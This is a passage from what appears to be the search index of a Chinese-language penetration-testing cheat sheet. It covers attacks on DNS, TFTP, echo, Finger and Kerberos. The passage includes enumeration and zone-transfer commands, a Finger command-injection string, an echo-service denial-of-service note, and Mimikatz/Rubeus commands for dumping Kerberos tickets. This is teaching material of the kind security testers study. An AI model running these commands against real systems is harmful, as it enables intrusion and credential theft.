pri.authdns.ripe.net","title":"IPv6"},{"location":"Network%20Prot/53%20-%20DNS%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#dns-ddos","text":"\u5982\u679c \u542f\u7528 DNS \u9012\u5f52 \uff0c\u653b\u51fb\u8005\u53ef\u4ee5 \u6b3a\u9a97UDP \u6570\u636e\u5305 \u7684\u6765\u6e90 \uff0c\u4ee5\u4fbf\u4f7f DNS \u5c06\u54cd\u5e94\u53d1\u9001\u5230\u53d7\u5bb3\u670d\u52a1\u5668 \u3002\u653b\u51fb\u8005\u53ef\u4ee5\u6ee5\u7528 ANY \u6216 DNSSEC \u8bb0\u5f55\u7c7b\u578b\uff0c\u56e0\u4e3a\u5b83\u4eec\u8fc7\u53bb\u5e38\u5e38\u6709\u66f4\u5927\u7684\u54cd\u5e94\u3002 \u68c0\u67e5 DNS \u662f\u5426\u652f\u6301 \u9012\u5f52\u7684 \u65b9\u6cd5\u662f\u67e5\u8be2\u57df\u540d\u5e76 \u68c0\u67e5 \u6807\u5fd7\u201cra\u201d \uff08 \u9012\u5f52\u53ef\u7528 \uff09\u662f\u5426\u5728\u54cd\u5e94\u4e2d\uff1a dig google.com A @<IP> \u4e0d\u53ef\u7528 : \u53ef\u7528 :","title":"DNS \u9012\u5f52 DDoS \u653b\u51fb"},{"location":"Network%20Prot/53%20-%20DNS%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_7","text":"\u51fa\u81ea\u4e66\u7c4d\uff1a\u7f51\u7edc\u5b89\u5168\u8bc4\u4f30\uff08\u7b2c 3 \u7248\uff09 \u7b80\u5355\u5730\u5411\u76ee\u6807\u57df\u4e2d\u4e0d\u5b58\u5728\u7684\u5730\u5740\u53d1\u9001\u7535\u5b50\u90ae\u4ef6\u901a\u5e38\u4f1a\u901a\u8fc7 \u672a\u9001\u8fbe\u901a\u77e5 (NDN) \u63ed\u793a\u6709\u7528\u7684\u5185\u90e8\u7f51\u7edc\u4fe1\u606f\u3002 Generating server: noa.nintendo.com blah@nintendo.com #550 5.1.1 RESOLVER.ADR.RecipNotFound; not found ## Original message headers: Received: from ONERDEDGE02.one.nintendo.com (10.13.20.35) by onerdexch08.one.nintendo.com (10.13.30.39) with Microsoft SMTP Server (TLS) id 14.3.174.1; Sat, 26 Apr 2014 16:52:22 -0700 Received: from barracuda.noa.nintendo.com (205.166.76.35) by ONERDEDGE02.one.nintendo.com (10.13.20.35) with Microsoft SMTP Server (TLS) id 14.3.174.1; Sat, 26 Apr 2014 16:51:22 -0700 X-ASG-Debug-ID: 1398556333-0614671716199b0d0001-zOQ9WJ Received: from gateway05.websitewelcome.com (gateway05.websitewelcome.com [69.93.154.37]) by barracuda.noa.nintendo.com with ESMTP id xVNPkwaqGgdyH5Ag for <blah@nintendo.com>; Sat, 26 Apr 2014 16:52:13 -0700 (PDT) X-Barracuda-Envelope-From: chris@example.org X-Barracuda-Apparent-Source-IP: 69.93.154.37 \u4ee5\u4e0b\u8fd9\u6bb5\u6587\u5b57\u4e2d\u7684\u6570\u636e\u662f\u6709\u7528\u7684\uff1a \u5185\u90e8\u4e3b\u673a\u540d\u3001IP \u5730\u5740\u548c\u5b50\u57df\u5e03\u5c40 \u90ae\u4ef6\u670d\u52a1\u5668\u6b63\u5728\u8fd0\u884c Microsoft Exchange Server 2010 SP3 \u68ad\u5b50\u9c7c\u7f51\u7edc\u8bbe\u5907\u7528\u4e8e\u6267\u884c\u5185\u5bb9\u8fc7\u6ee4","title":"\u90ae\u5bc4\u5230\u4e0d\u5b58\u5728\u7684\u5e10\u6237"},{"location":"Network%20Prot/53%20-%20DNS%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_8","text":"host.conf /etc/resolv.conf /etc/bind/named.conf /etc/bind/named.conf.local /etc/bind/named.conf.options /etc/bind/named.conf.log /etc/bind/* \u914d\u7f6e\u7ed1\u5b9a\u670d\u52a1\u5668\u65f6\u7684\u5371\u9669\u8bbe\u7f6e\uff1a \u9009\u9879 \u63cf\u8ff0 allow-query \u5b9a\u4e49\u5141\u8bb8\u54ea\u4e9b\u4e3b\u673a\u5411 DNS \u670d\u52a1\u5668\u53d1\u9001\u8bf7\u6c42\u3002 allow-recursion \u5b9a\u4e49\u5141\u8bb8\u54ea\u4e9b\u4e3b\u673a\u5411 DNS \u670d\u52a1\u5668\u53d1\u9001\u9012\u5f52\u8bf7\u6c42\u3002 allow-transfer \u5b9a\u4e49\u5141\u8bb8\u54ea\u4e9b\u4e3b\u673a\u4ece DNS \u670d\u52a1\u5668\u63a5\u6536\u533a\u57df\u4f20\u8f93\u3002 zone-statistics \u6536\u96c6\u533a\u57df\u7684\u7edf\u8ba1\u6570\u636e\u3002","title":"\u914d\u7f6e\u6587\u4ef6"},{"location":"Network%20Prot/53%20-%20DNS%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_9","text":"Protocol_Name: DNS #\u534f\u8bae\u7684\u7f29\u5199\uff08\u5982\u679c\u6709\u7684\u8bdd\uff09\u3002 Port_Number: 53 #\u5982\u679c\u6709\u591a\u4e2a\uff0c\u7528\u9017\u53f7\u9694\u5f00 Protocol_Description: Domain Name Service #\u534f\u8bae\u7684\u7f29\u5199\u62fc\u5199\u51fa\u6765 Entry_1: Name: Notes Description: Notes for DNS Note: | #These are the commands I run every time I see an open DNS port dnsrecon -r 127.0.0.0/24 -n {IP} -d {Domain_Name} dnsrecon -r 127.0.1.0/24 -n {IP} -d {Domain_Name} dnsrecon -r {Network}{CIDR} -n {IP} -d {Domain_Name} dig axfr @{IP} dig axfr {Domain_Name} @{IP} nslookup SERVER {IP} 127.0.0.1 {IP} Domain_Name exit Entry_2: Name: Banner Grab Description: Grab DNS Banner Command: dig version.bind CHAOS TXT @DNS Entry_3: Name: Nmap Vuln Scan Description: Scan for Vulnerabilities with Nmap Command: nmap -n --script \"(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport\" {IP} Entry_4: Name: Zone Transfer Description: Three attempts at forcing a zone transfer Command: dig axfr @{IP} && dix axfr @{IP} {Domain_Name} && fierce -dns {Domain_Name} Entry_5: Name: Active Directory Description: Eunuerate a DC via DNS Command: dig -t _gc._{Domain_Name} && dig -t _ldap._{Domain_Name} && dig -t _kerberos._{Domain_Name} && dig -t _kpasswd._{Domain_Name} && nmap --script dns-srv-enum --script-args \"dns-srv-enum.domain={Domain_Name}\" Entry_6: Name: consolesless mfs enumeration Description: DNS enumeration without the need to run msfconsole Note: sourced from https://github.com/carlospolop/legion Command: msfconsole -q -x 'use auxiliary/scanner/dns/dns_amp; set RHOSTS {IP}; set RPORT 53; run; exit' && msfconsole -q -x 'use auxiliary/gather/enum_dns; set RHOSTS {IP}; set RPORT 53; run; exit'","title":"\u81ea\u52a8\u5316\u547d\u4ee4"},{"location":"Network%20Prot/69-udp-tftp%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","text":"\u57fa\u672c\u4fe1\u606f TFTP \u4f7f\u7528 UDP \u7aef\u53e3 69\uff0c\u5e76\u4e14 \u4e0d\u9700\u8981\u8eab\u4efd\u9a8c\u8bc1 \u2014\u2014\u5ba2\u6237\u7aef\u901a\u8fc7 RFC 1350 \u4e2d\u6982\u8ff0\u7684\u6570\u636e\u62a5\u683c\u5f0f\u4ece\u670d\u52a1\u5668\u8bfb\u53d6\u548c\u5199\u5165\u6570\u636e\u3002\u7531\u4e8e\u8be5\u534f\u8bae\u7684\u7f3a\u9677\uff08\u5373\u7f3a\u5c11\u8eab\u4efd\u9a8c\u8bc1\u548c\u6ca1\u6709\u4f20\u8f93\u5b89\u5168\u6027\uff09\uff0c\u5f88\u5c11\u80fd\u5728\u516c\u5171\u4e92\u8054\u7f51\u4e0a\u627e\u5230\u670d\u52a1\u5668\u3002\u7136\u800c\uff0c\u5728\u5927\u578b\u5185\u90e8\u7f51\u7edc\u4e2d\uff0cTFTP \u7528\u4e8e\u63d0\u4f9b VoIP \u7535\u8bdd\u548c\u5176\u4ed6\u8bbe\u5907\u7684\u914d\u7f6e\u6587\u4ef6\u548c ROM \u955c\u50cf\u3002 \u9ed8\u8ba4\u7aef\u53e3\uff1a 69/UDP PORT STATE SERVICE REASON 69/udp open tftp script-set \u679a\u4e3e TFTP \u4e0d\u63d0\u4f9b\u76ee\u5f55\u5217\u8868\uff0c\u56e0\u6b64 tftp-enum \u6765\u81ea\u7684\u811a\u672c nmap \u5c06\u5c1d\u8bd5\u66b4\u529b\u7834\u89e3\u9ed8\u8ba4\u8def\u5f84\u3002 nmap -n -Pn -sU -p69 -sV --script tftp-enum <IP> \u4e0b\u8f7d/\u4e0a\u4f20 \u60a8\u53ef\u4ee5\u4f7f\u7528 Metasploit \u6216 Python \u68c0\u67e5\u60a8\u662f\u5426\u53ef\u4ee5\u4e0b\u8f7d/\u4e0a\u4f20\u6587\u4ef6\uff1a msf5> auxiliary/admin/tftp/tftp_transfer_util import tftpy client = tftpy.TftpClient(<ip>, <port>) client.download(\"filename in server\", \"/tmp/filename\", timeout=5) client.upload(\"filename to upload\", \"/local/path/file\", timeout=5) Shodan port:69","title":"69 - udp/tftp\u6e17\u900f\u6d4b\u8bd5"},{"location":"Network%20Prot/69-udp-tftp%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_1","text":"TFTP \u4f7f\u7528 UDP \u7aef\u53e3 69\uff0c\u5e76\u4e14 \u4e0d\u9700\u8981\u8eab\u4efd\u9a8c\u8bc1 \u2014\u2014\u5ba2\u6237\u7aef\u901a\u8fc7 RFC 1350 \u4e2d\u6982\u8ff0\u7684\u6570\u636e\u62a5\u683c\u5f0f\u4ece\u670d\u52a1\u5668\u8bfb\u53d6\u548c\u5199\u5165\u6570\u636e\u3002\u7531\u4e8e\u8be5\u534f\u8bae\u7684\u7f3a\u9677\uff08\u5373\u7f3a\u5c11\u8eab\u4efd\u9a8c\u8bc1\u548c\u6ca1\u6709\u4f20\u8f93\u5b89\u5168\u6027\uff09\uff0c\u5f88\u5c11\u80fd\u5728\u516c\u5171\u4e92\u8054\u7f51\u4e0a\u627e\u5230\u670d\u52a1\u5668\u3002\u7136\u800c\uff0c\u5728\u5927\u578b\u5185\u90e8\u7f51\u7edc\u4e2d\uff0cTFTP \u7528\u4e8e\u63d0\u4f9b VoIP \u7535\u8bdd\u548c\u5176\u4ed6\u8bbe\u5907\u7684\u914d\u7f6e\u6587\u4ef6\u548c ROM \u955c\u50cf\u3002 \u9ed8\u8ba4\u7aef\u53e3\uff1a 69/UDP PORT STATE SERVICE REASON 69/udp open tftp script-set","title":"\u57fa\u672c\u4fe1\u606f"},{"location":"Network%20Prot/69-udp-tftp%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_2","text":"TFTP \u4e0d\u63d0\u4f9b\u76ee\u5f55\u5217\u8868\uff0c\u56e0\u6b64 tftp-enum \u6765\u81ea\u7684\u811a\u672c nmap \u5c06\u5c1d\u8bd5\u66b4\u529b\u7834\u89e3\u9ed8\u8ba4\u8def\u5f84\u3002 nmap -n -Pn -sU -p69 -sV --script tftp-enum <IP>","title":"\u679a\u4e3e"},{"location":"Network%20Prot/69-udp-tftp%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_3","text":"\u60a8\u53ef\u4ee5\u4f7f\u7528 Metasploit \u6216 Python \u68c0\u67e5\u60a8\u662f\u5426\u53ef\u4ee5\u4e0b\u8f7d/\u4e0a\u4f20\u6587\u4ef6\uff1a msf5> auxiliary/admin/tftp/tftp_transfer_util import tftpy client = tftpy.TftpClient(<ip>, <port>) client.download(\"filename in server\", \"/tmp/filename\", timeout=5) client.upload(\"filename to upload\", \"/local/path/file\", timeout=5)","title":"\u4e0b\u8f7d/\u4e0a\u4f20"},{"location":"Network%20Prot/69-udp-tftp%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#shodan","text":"port:69","title":"Shodan"},{"location":"Network%20Prot/7-tcp-udp%20-%20ECHO%E6%B8%97%E9%80%8F/","text":"\u57fa\u672c\u4fe1\u606f \u8be5\u4e3b\u673a\u4e0a\u6b63\u5728\u8fd0\u884c\u4e00\u4e2aecho\u670d\u52a1\u3002echo\u670d\u52a1\u7528\u4e8e\u6d4b\u8bd5\u548c\u6d4b\u91cf\u76ee\u7684\uff0c\u53ef\u4ee5\u76d1\u542cTCP\u548cUDP\u534f\u8bae\u3002\u670d\u52a1\u5668\u53d1\u9001\u56de\u5b83\u63a5\u6536\u5230\u7684\u4efb\u4f55\u6570\u636e\uff0c\u4e0d\u505a\u4efb\u4f55\u4fee\u6539\u3002 \u901a\u8fc7\u5c06\u56de\u58f0\u670d\u52a1\u8fde\u63a5\u5230\u540c\u4e00\u53f0\u6216\u53e6\u4e00\u53f0\u673a\u5668\u4e0a\u7684\u56de\u58f0\u670d\u52a1\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4\u62d2\u7edd\u670d\u52a1 \u3002\u7531\u4e8e\u4ea7\u751f\u7684\u6570\u636e\u5305\u6570\u91cf\u8fc7\u9ad8\uff0c\u53d7\u5f71\u54cd\u7684\u673a\u5668\u53ef\u80fd\u4f1a\u6709\u6548\u5730\u505c\u6b62\u670d\u52a1\u3002 \u53c2\u8003 https://www.acunetix.com/vulnerabilities/web/echo-service-running/ \u9ed8\u8ba4\u7aef\u53e3: 7/tcp/udp PORT STATE SERVICE 7/udp open echo 7/tcp open echo ## \u8bbf\u95ee Echo \u670d\u52a1(UDP) nc -uvn <IP> 7 Hello echo #This is wat you send Hello echo #This is the response ## Shodan port:7 echo","title":"7 tcp/udp - ECHO\u6e17\u900f"},{"location":"Network%20Prot/7-tcp-udp%20-%20ECHO%E6%B8%97%E9%80%8F/#_1","text":"\u8be5\u4e3b\u673a\u4e0a\u6b63\u5728\u8fd0\u884c\u4e00\u4e2aecho\u670d\u52a1\u3002echo\u670d\u52a1\u7528\u4e8e\u6d4b\u8bd5\u548c\u6d4b\u91cf\u76ee\u7684\uff0c\u53ef\u4ee5\u76d1\u542cTCP\u548cUDP\u534f\u8bae\u3002\u670d\u52a1\u5668\u53d1\u9001\u56de\u5b83\u63a5\u6536\u5230\u7684\u4efb\u4f55\u6570\u636e\uff0c\u4e0d\u505a\u4efb\u4f55\u4fee\u6539\u3002 \u901a\u8fc7\u5c06\u56de\u58f0\u670d\u52a1\u8fde\u63a5\u5230\u540c\u4e00\u53f0\u6216\u53e6\u4e00\u53f0\u673a\u5668\u4e0a\u7684\u56de\u58f0\u670d\u52a1\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4\u62d2\u7edd\u670d\u52a1 \u3002\u7531\u4e8e\u4ea7\u751f\u7684\u6570\u636e\u5305\u6570\u91cf\u8fc7\u9ad8\uff0c\u53d7\u5f71\u54cd\u7684\u673a\u5668\u53ef\u80fd\u4f1a\u6709\u6548\u5730\u505c\u6b62\u670d\u52a1\u3002 \u53c2\u8003 https://www.acunetix.com/vulnerabilities/web/echo-service-running/ \u9ed8\u8ba4\u7aef\u53e3: 7/tcp/udp PORT STATE SERVICE 7/udp open echo 7/tcp open echo ## \u8bbf\u95ee Echo \u670d\u52a1(UDP) nc -uvn <IP> 7 Hello echo #This is wat you send Hello echo #This is the response ## Shodan port:7 echo","title":"\u57fa\u672c\u4fe1\u606f"},{"location":"Network%20Prot/79%20-%20Finger%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","text":"\u57fa\u672c\u4fe1\u606f Finger \u662f\u4e00\u4e2a\u53ef\u4ee5\u7528\u6765\u67e5\u627e\u8ba1\u7b97\u673a\u7528\u6237\u4fe1\u606f\u7684\u7a0b\u5e8f\u3002\u5b83\u901a\u5e38\u4f1a\u5217\u51fa\u767b\u5f55\u540d\u3001\u5168\u540d\u4ee5\u53ca\u5173\u4e8e\u60a8\u6b63\u5728\u6307\u5411\u7684\u7528\u6237\u7684\u5176\u4ed6\u8be6\u7ec6\u4fe1\u606f\u3002\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u529e\u516c\u5ba4\u4f4d\u7f6e\u548c\u7535\u8bdd\u53f7\u7801\uff08\u5982\u679c\u5df2\u77e5\u7684\u8bdd\uff09\u3001\u767b\u5f55\u65f6\u95f4\u3001\u7a7a\u95f2\u65f6\u95f4\u3001\u90ae\u4ef6\u6700\u540e\u4e00\u6b21\u8bfb\u53d6\u7684\u65f6\u95f4\u4ee5\u53ca\u7528\u6237\u7684\u8ba1\u5212\u548c\u9879\u76ee\u6587\u4ef6\u3002 \u5e38\u7528\u7aef\u53e3\uff1a 79 PORT STATE SERVICE 79/tcp open finger \u679a\u4e3e Banner \u6293\u53d6/\u57fa\u672c\u8fde\u63a5 nc -vn <IP> 79 echo \"root\" | nc -vn <IP> 79 \u7528\u6237\u679a\u4e3e finger @<Victim> #\u5217\u51fa\u7528\u6237 finger admin@<Victim> #\u83b7\u53d6\u7528\u6237\u4fe1\u606f finger user@<Victim> #\u83b7\u53d6\u7528\u6237\u4fe1\u606f \u4f7f\u7528 pentestmonkey \u4e2d\u7684 finger-user-enum \uff0c\u4e00\u4e9b\u793a\u4f8b\uff1a finger-user-enum.pl -U users.txt -t 10.0.0.1 finger-user-enum.pl -u root -t 10.0.0.1 finger-user-enum.pl -U users.txt -T ips.txt Nmap \u4f7f\u7528\u9ed8\u8ba4\u811a\u672c\u6267\u884c\u811a\u672c Metasploit \u4f7f\u7528\u7684\u6280\u5de7\u6bd4 Nmap \u66f4\u591a use auxiliary/scanner/finger/finger_users Shodan port:79 USER \u547d\u4ee4\u6267\u884c finger \"|/bin/id@example.com\" finger \"|/bin/ls -a /@example.com\" Finger \u5f39\u8df3 Use a system as a finger relay finger user@host@victim finger @internal@external","title":"79 - Finger \u6e17\u900f\u6d4b\u8bd5"},{"location":"Network%20Prot/79%20-%20Finger%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_1","text":"Finger \u662f\u4e00\u4e2a\u53ef\u4ee5\u7528\u6765\u67e5\u627e\u8ba1\u7b97\u673a\u7528\u6237\u4fe1\u606f\u7684\u7a0b\u5e8f\u3002\u5b83\u901a\u5e38\u4f1a\u5217\u51fa\u767b\u5f55\u540d\u3001\u5168\u540d\u4ee5\u53ca\u5173\u4e8e\u60a8\u6b63\u5728\u6307\u5411\u7684\u7528\u6237\u7684\u5176\u4ed6\u8be6\u7ec6\u4fe1\u606f\u3002\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u529e\u516c\u5ba4\u4f4d\u7f6e\u548c\u7535\u8bdd\u53f7\u7801\uff08\u5982\u679c\u5df2\u77e5\u7684\u8bdd\uff09\u3001\u767b\u5f55\u65f6\u95f4\u3001\u7a7a\u95f2\u65f6\u95f4\u3001\u90ae\u4ef6\u6700\u540e\u4e00\u6b21\u8bfb\u53d6\u7684\u65f6\u95f4\u4ee5\u53ca\u7528\u6237\u7684\u8ba1\u5212\u548c\u9879\u76ee\u6587\u4ef6\u3002","title":"\u57fa\u672c\u4fe1\u606f"},{"location":"Network%20Prot/79%20-%20Finger%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#79","text":"PORT STATE SERVICE 79/tcp open finger","title":"\u5e38\u7528\u7aef\u53e3\uff1a 79"},{"location":"Network%20Prot/79%20-%20Finger%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_2","text":"","title":"\u679a\u4e3e"},{"location":"Network%20Prot/79%20-%20Finger%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#banner","text":"nc -vn <IP> 79 echo \"root\" | nc -vn <IP> 79","title":"Banner \u6293\u53d6/\u57fa\u672c\u8fde\u63a5"},{"location":"Network%20Prot/79%20-%20Finger%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_3","text":"finger @<Victim> #\u5217\u51fa\u7528\u6237 finger admin@<Victim> #\u83b7\u53d6\u7528\u6237\u4fe1\u606f finger user@<Victim> #\u83b7\u53d6\u7528\u6237\u4fe1\u606f \u4f7f\u7528 pentestmonkey \u4e2d\u7684 finger-user-enum \uff0c\u4e00\u4e9b\u793a\u4f8b\uff1a finger-user-enum.pl -U users.txt -t 10.0.0.1 finger-user-enum.pl -u root -t 10.0.0.1 finger-user-enum.pl -U users.txt -T ips.txt","title":"\u7528\u6237\u679a\u4e3e"},{"location":"Network%20Prot/79%20-%20Finger%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#nmap","text":"","title":"Nmap \u4f7f\u7528\u9ed8\u8ba4\u811a\u672c\u6267\u884c\u811a\u672c"},{"location":"Network%20Prot/79%20-%20Finger%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#metasploit-nmap","text":"use auxiliary/scanner/finger/finger_users","title":"Metasploit \u4f7f\u7528\u7684\u6280\u5de7\u6bd4 Nmap \u66f4\u591a"},{"location":"Network%20Prot/79%20-%20Finger%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#shodan","text":"port:79 USER","title":"Shodan"},{"location":"Network%20Prot/79%20-%20Finger%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_4","text":"finger \"|/bin/id@example.com\" finger \"|/bin/ls -a /@example.com\"","title":"\u547d\u4ee4\u6267\u884c"},{"location":"Network%20Prot/79%20-%20Finger%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#finger","text":"Use a system as a finger relay finger user@host@victim finger @internal@external","title":"Finger \u5f39\u8df3"},{"location":"Network%20Prot/88-tcp-udp-kerberos%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","text":"\u57fa\u672c\u4fe1\u606f \u9996\u5148\uff0cKerberos \u662f\u4e00\u79cd\u8ba4\u8bc1\u534f\u8bae\uff0c\u800c\u4e0d\u662f\u6388\u6743\u534f\u8bae\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u5b83\u5141\u8bb8\u8bc6\u522b\u6bcf\u4e2a\u63d0\u4f9b\u5bc6\u7801\u7684\u7528\u6237\uff0c\u4f46\u4e0d\u4f1a\u9a8c\u8bc1\u7528\u6237\u5bf9\u54ea\u4e9b\u8d44\u6e90\u6216\u670d\u52a1\u5177\u6709\u8bbf\u95ee\u6743\u9650\u3002 Kerberos \u5728 Active Directory \u4e2d\u4f7f\u7528\u3002\u5728\u8fd9\u4e2a\u5e73\u53f0\u4e2d\uff0cKerberos \u63d0\u4f9b\u6bcf\u4e2a\u7528\u6237\u7684\u6743\u9650\u4fe1\u606f\uff0c\u4f46\u662f\u786e\u5b9a\u7528\u6237\u662f\u5426\u5177\u6709\u8bbf\u95ee\u5176\u8d44\u6e90\u7684\u8d23\u4efb\u5728\u4e8e\u6bcf\u4e2a\u670d\u52a1\u3002 \u9ed8\u8ba4\u7aef\u53e3: 88/tcp/udp PORT STATE SERVICE 88/tcp open kerberos-sec \u66f4\u591a \u4ece Windows \u83b7\u53d6\u7968\u636e \u5728 Windows \u4e2d\uff0c\u7968\u8bc1\u7531\u8d1f\u8d23\u5b89\u5168\u6027\u7684 lsass\uff08\u672c\u5730\u5b89\u5168\u673a\u6784\u5b50\u7cfb\u7edf\u670d\u52a1\uff09\u8fdb\u7a0b\u5904\u7406\u548c\u5b58\u50a8\u3002 \u56e0\u6b64\uff0c\u8981\u4ece Windows \u7cfb\u7edf\u68c0\u7d22\u7968\u8bc1\uff0c\u6709\u5fc5\u8981 \u4e0e lsass \u901a\u4fe1\u5e76\u8bf7\u6c42\u5b83\u4eec \u3002\u4f5c\u4e3a \u975e\u7ba1\u7406\u5458\u7528\u6237\u53ea\u80fd\u83b7\u53d6\u62e5\u6709\u7684\u7968 \uff0c\u4f46\u662f\u4f5c\u4e3a\u673a\u5668 \u7ba1\u7406\u5458 \uff0c\u53ef\u4ee5\u83b7\u53d6 \u6240\u6709\u7968\u3002 \u4e3a\u6b64\uff0c\u53ef\u4ee5\u4f7f\u7528 Mimikatz \u6216 Rubeus\u5de5\u5177 \uff0c\u5982\u4e0b\u6240\u793a\uff1a # Using mimikatz sekurlsa::tickets /export # Using Rubeus ## Dump all tickets .\\Rubeus dump [IO.File]::WriteAllBytes(\"ticket.kirbi\", [Convert]::FromBase64String(\"<BASE64_TICKET>\")) ## List all tickets .\\Rubeus.exe triage ## Dump the interesting one by luid .\\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap [IO.File]::WriteAllBytes(\"ticket.kirbi\", [Convert]::FromBase64String(\"<BASE64_TICKET>\")) \u4ece Linux \u83b7\u53d6\u7968\u636e \u5728 Linux \u7cfb\u7edf\u4e2d\uff0c\u7968\u636e\u50a8\u5b58\u5728\u51ed\u636e\u7f13\u5b58\uff08credential caches\uff09\u6216 ccaches \u4e2d\u3002\u51ed\u636e\u7f13\u5b58\u662f\u4e00\u79cd\u5b58\u50a8\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f\u7684\u6570\u636e\u7ed3\u6784\uff0c\u7528\u4e8e\u5728 Linux \u7cfb\u7edf\u4e0a\u50a8\u5b58\u548c\u7ba1\u7406\u7968\u636e\u3002\u5b83\u6709 3 \u79cd\u4e3b\u8981\u7c7b\u578b\uff0c\u8fd9\u4e9b\u7c7b\u578b\u8868\u793a\u7968\u636e\u53ef\u4ee5\u5728\u54ea\u91cc\u627e\u5230\uff1a FILE\uff1a\u8868\u793a\u7968\u636e\u50a8\u5b58\u5728\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u6587\u4ef6\u8def\u5f84\u8bbf\u95ee\u3002 KEYRING\uff1a\u8868\u793a\u7968\u636e\u50a8\u5b58\u5728\u5185\u6838\u7684\u79d8\u94a5\u73af\uff08keyring\uff09\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u5185\u6838\u63a5\u53e3\u8bbf\u95ee\u3002 MEMORY\uff1a\u8868\u793a\u7968\u636e\u50a8\u5b58\u5728\u5185\u5b58\u4e2d\uff0c\u53ea\u80fd\u901a\u8fc7\u5f53\u524d\u8fdb\u7a0b\u8bbf\u95ee\u3002 \u56e0\u6b64\uff0c\u5728 Linux \u7cfb\u7edf\u4e2d\uff0c\u7968\u636e\u50a8\u5b58\u5728\u51ed\u636e\u7f13\u5b58\u6216 ccaches \u4e2d\uff0c\u6709 3 \u79cd\u4e3b\u8981\u7c7b\u578b\uff0c\u6307\u793a\u7968\u636e\u53ef\u4ee5\u5728\u54ea\u91cc\u627e\u5230\u3002 \u4e3a\u4e86\u68c0\u67e5\u67d0\u53f0\u7279\u5b9a\u673a\u5668\u4f7f\u7528\u7684\u5b58\u50a8\u7c7b\u578b\uff0c\u5fc5\u987b\u5728 /etc/krb5.conf \u6587\u4ef6\u4e2d\u68c0\u67e5 default_ccache_name \u53d8\u91cf\u3002\u8be5\u6587\u4ef6\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5bf9\u4efb\u4f55\u7528\u6237\u90fd\u6709\u8bfb\u6743\u9650\u3002\u5982\u679c\u8fd9\u4e2a\u53c2\u6570\u4e22\u5931\u4e86\uff0c\u5b83\u7684\u9ed8\u8ba4\u503c\u662f FILE:/tmp/krb5cc_%{uid} \u3002 \u4e3a\u4e86 \u4ece\u5176\u4ed6 2 \u4e2a\u6765\u6e90 \uff08\u5bc6\u94a5\u73af\u548c\u8fdb\u7a0b\uff09\u4e2d\u63d0\u53d6\u7968\u8bc1\uff0c2017 \u5e74\u53d1\u5e03\u7684\u4e00\u7bc7\u5f88\u68d2\u7684\u8bba\u6587 Kerberos Credential Thievery (GNU/Linux) \u89e3\u91ca\u4e86\u4ece\u4e2d\u6062\u590d\u7968\u8bc1\u7684\u65b9\u6cd5\u3002 \u79d8\u94a5\u73af - \u6765\u81ea paper Linux \u5185\u6838\u5177\u6709\u4e00\u4e2a\u540d\u4e3a keyrings \u7684\u529f\u80fd\u3002\u8fd9\u662f\u4e00\u4e2a\u9a7b\u7559\u5728\u5185\u6838\u4e2d\u7684\u5185\u5b58\u533a\u57df\uff0c\u7528\u4e8e\u7ba1\u7406\u548c\u4fdd\u7559\u5bc6\u94a5\u3002 keyctl \u7cfb\u7edf\u8c03\u7528\u5728\u5185\u6838\u7248\u672c 2.6.10 5 \u4e2d\u5f15\u5165\u3002\u5b83\u4e3a\u7528\u6237\u7a7a\u95f4\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u4e86\u4e00\u4e2a API\uff0c\u53ef\u4ee5\u7528\u5b83\u6765\u4e0e\u5185\u6838 keyrings \u4ea4\u4e92\u3002 \u5185\u6838 keyring \u7684\u540d\u79f0\u53ef\u4ee5\u4ece Kerberos \u914d\u7f6e\u6587\u4ef6 /etc/krb5.conf \u89e3\u6790\uff0c\u8be5\u6587\u4ef6\u9ed8\u8ba4\u5bf9\u4efb\u4f55\u4eba\u90fd\u5177\u6709\u8bfb\u6743\u9650\uff08\u516b\u8fdb\u5236 644\uff09\u3002\u7136\u540e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u4fe1\u606f\u641c\u7d22\u5305\u542b keyring \u7684\u7968\u636e 11\uff0c\u5e76\u63d0\u53d6\u7968\u636e\u3002\u5b9e\u73b0\u6b64\u529f\u80fd\u7684\u6982\u5ff5\u9a8c\u8bc1\u811a\u672c\u53ef\u4ee5\u5728 A.2 \u8282\uff08hercules.sh\uff09\u4e2d\u770b\u5230\u3002\u5728 keyring \u4e2d\uff0cccache \u88ab\u5b58\u50a8\u4e3a\u7ec4\u4ef6\u3002\u5982\u56fe 2 \u6240\u793a\uff0c\u6587\u4ef6 ccache \u7531 3 